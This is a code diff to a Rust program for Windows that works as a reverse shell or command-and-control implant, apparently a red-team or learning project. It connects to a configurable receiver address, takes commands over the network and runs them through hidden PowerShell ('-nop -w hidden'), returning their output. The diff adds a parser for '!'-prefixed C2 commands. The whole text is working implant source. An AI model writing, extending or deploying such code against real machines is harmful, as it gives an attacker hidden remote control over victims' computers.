@@ -2,6 +2,8 @@ use std::{io::{Write, BufWriter, BufReader, BufRead}, net, process::Command};
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
 use windows::core::PCSTR;
 use windows::Win32::Foundation::HWND;
+mod cmd;
+use cmd::parse_command;
 
 /// 
 /// The receiver address. Change this!
@@ -57,23 +59,39 @@ fn main() {
 
             Ok(bytes_written) => {
                 if bytes_written > 0 {
+
+                    // Remove the newline
                     let cmd = read_buf.trim();
 
-                    // Use the Command builder pattern to construct our
-                    // not-at-all-stealthy command
-                    let output = Command::new("powershell")
-                    .arg("-nop")
-                    .arg("-w")
-                    .arg("hidden")
-                    .arg("-c")
-                    .arg(format!("{cmd}"))
-                    .output()
-                    .expect("Command failed!");  
-
-                    // Join stdout and stderr in the output
-                    tx.write(&output.stdout).unwrap();
-                    tx.write(&output.stderr).unwrap();
+                    // Let's check to see if we have a real Command
+                    if cmd.starts_with("!") {
+                        match parse_command(cmd) {
+                            Some(c) => {
+                                tx.write(format!("C2 Command: {:?}", c).as_bytes()).unwrap();
+                            },
+                            None => {
+                                tx.write(format!("Bad Command: {cmd}").as_bytes()).unwrap();
+                            }
+                        }
+                    } else {
+                        // Use the Command builder pattern to construct our
+                        // not-at-all-stealthy command
+                        let output = Command::new("powershell")
+                        .arg("-nop")
+                        .arg("-w")
+                        .arg("hidden")
+                        .arg("-c")
+                        .arg(format!("{cmd}"))
+                        .output()
+                        .expect("Command failed!");  
+    
+                        // Join stdout and stderr in the output
+                        tx.write(&output.stdout).unwrap();
+                        tx.write(&output.stderr).unwrap();
+                        
+                    }
                     tx.flush().unwrap();
+
 
                 } else {
                     println!("Connection closed."); 
